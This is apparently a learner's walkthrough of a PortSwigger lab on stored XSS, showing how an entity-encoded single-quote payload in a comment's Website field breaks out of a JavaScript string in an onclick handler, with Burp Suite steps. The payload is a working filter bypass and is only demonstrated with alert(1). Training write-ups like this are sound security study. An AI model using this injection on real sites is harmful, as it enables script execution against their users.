# Stored XSS Lab — `onclick` Event Handler
## Lab

**Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

---

## Payload

http://foo?&apos;-alert(1)-&apos;

### Decoded form

http://foo?'-alert(1)-'

---

# Step 1 — Open the Comment Form

Open the PortSwigger lab and go to the **comment form**.

The form contains fields such as:

Comment
Name
Email
Website

Enter a normal value in the **Website** field first:

http://test.com

Fill the other fields normally and submit the comment.

---

# Step 2 — Capture the POST Request

Open:

**Burp Suite → Proxy → HTTP history**

Find the request that submitted your comment.

It will look similar to:

```http
POST /post/comment HTTP/2
```

Right-click the request and select:

Send to Repeater

---

# Step 3 — Put the XSS Payload in the Website Field

Go to:

**Burp Suite → Repeater**

Find the Website parameter.

It may look something like:

website=http%3A%2F%2Ftest.com

Replace the Website value with:

http://foo?&apos;-alert(1)-&apos;

Then click:

**Send**

### Important

Do **not** add:

```html
onclick=
```

or:

```html
<script>
```

or:

```html
<a>
```

The website already creates the `onclick` attribute.

Your payload only goes into the **Website** value.

---

# Step 4 — Find the GET Request

After storing the comment, go back to:

**Burp Suite → Proxy → HTTP history**

Find the request that loads the post.

It should look similar to:

```http
GET /post?postId=5 HTTP/2
```

Right-click it and select:

Send to Repeater

---

# Step 5 — Send the GET Request

Go to:

**Repeater**

Click:

**Send**

Look at the response.

You should find your Website input inside an `onclick` attribute similar to:

```html
<a id="author"
   href="https://example.com/post?postId=5"
   onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">
   abc
</a>
```

The important part is:

```html
onclick="...tracker.track('YOUR_INPUT');"
```

---

# Step 6 — Understand the Vulnerable Sink

The application takes the Website input and places it inside:

```html
onclick=""
```

More specifically, your input is placed inside a JavaScript string:

```javascript
tracker.track('YOUR_INPUT');
```

So the context is:

HTML
  ↓
onclick attribute
  ↓
JavaScript
  ↓
JavaScript string

This is why this is an **XSS vulnerability in a JavaScript event-handler context**.

---

# Step 7 — Why the Payload Works

The original JavaScript looks like:

```javascript
tracker.track('YOUR_INPUT');
```

The payload contains:

&apos;

which represents: '
So the payload:

http://foo?&apos;-alert(1)-&apos;

becomes effectively:

http://foo?'-alert(1)-'

The single quote interferes with the existing JavaScript string.

The important part is:

'-alert(1)-'

which causes:

```javascript
alert(1)
```

to be interpreted as JavaScript.

---

# Step 8 — Verify the XSS

The lab instructions ask you to interact with the author link associated with your comment.

You can:

1. Right-click the author/name link.
2. Select **Copy link address**.
3. Paste the copied URL into the browser.
4. Open the link.
5. Click the author's name/link if required by the lab.

If the payload executes successfully, you should see:

Alert: 1

---

# Complete Flow

Website field
     ↓
http://foo?&apos;-alert(1)-&apos;
     ↓
POST /post/comment
     ↓
Send POST to Repeater
     ↓
Send modified POST
     ↓
Comment is stored
     ↓
GET /post?postId=...
     ↓
Send GET to Repeater
     ↓
Server returns stored comment
     ↓
Input appears inside onclick=""
     ↓
JavaScript context
     ↓
alert(1)

---

# What I Learned

### Input field

Website

### Payload

http://foo?&apos;-alert(1)-&apos;

### Decoded payload

http://foo?'-alert(1)-'

### Vulnerable sink

```html
onclick="..."
```

### Vulnerable context

JavaScript inside an HTML onclick event-handler attribute

### Vulnerability type

Stored XSS

### Why it is stored XSS

The payload is first submitted and **stored by the application**. Later, when the post is viewed, the stored input is inserted into the `onclick` JavaScript context.

---

# Important Reminder

I do **not** need to write:

```html
<script>alert(1)</script>
```

or:

```html
onclick=alert(1)
```

The application already provides the HTML and `onclick` handler.

I only provide the payload through the:

Website

field.
